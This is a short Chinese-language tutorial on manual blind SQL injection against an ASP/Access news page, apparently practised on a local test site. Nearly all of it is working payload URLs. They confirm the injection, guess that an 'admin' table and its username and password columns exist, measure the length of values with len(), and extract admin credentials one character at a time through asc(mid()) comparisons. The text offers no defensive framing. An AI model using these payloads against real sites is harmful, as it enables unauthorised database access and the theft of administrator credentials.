## **1、判断注入**

and 1=1

and 1=2

## 2、猜表

页面返回正常 说明 表存在

http://127.0.0.1:99/shownews.asp?id=110 and exists (select * from admin)

## 3、猜列

http://127.0.0.1:99/shownews.asp?id=110 and exists (select username from admin)

http://127.0.0.1:99/shownews.asp?id=110 and exists (select password from admin)

## 4、猜数据长度

查询字段的长度

http://127.0.0.1:99/shownews.asp?id=110 and (select top 1 len(username) from admin)=8

等于8就是确定数据的长度 也可以使用大于（>）小于（<）个人认为 等于（=）最好确定长度

查询数据asccii码

mid() 截取位置
asc() ascii码

第一个长度的ascii码长度 页面返回正常

http://127.0.0.1:99/shownews.asp?id=110 and (select top 1 asc(mid(username,1,1)) from admin)=97

http://127.0.0.1:99/shownews.asp?id=110 and (select top 1 asc(mid(username,2,1)) from admin)=100

http://127.0.0.1:99/shownews.asp?id=110 and (select top 1 asc(mid(password,1,1)) from admin)=100

猜解完之后 把ascii码 转换过来 并接 就是username字段的的数据，其他字段也是这样。

97的字符为 a 100的字符为d 并接起来就是ad 

 

 

 

 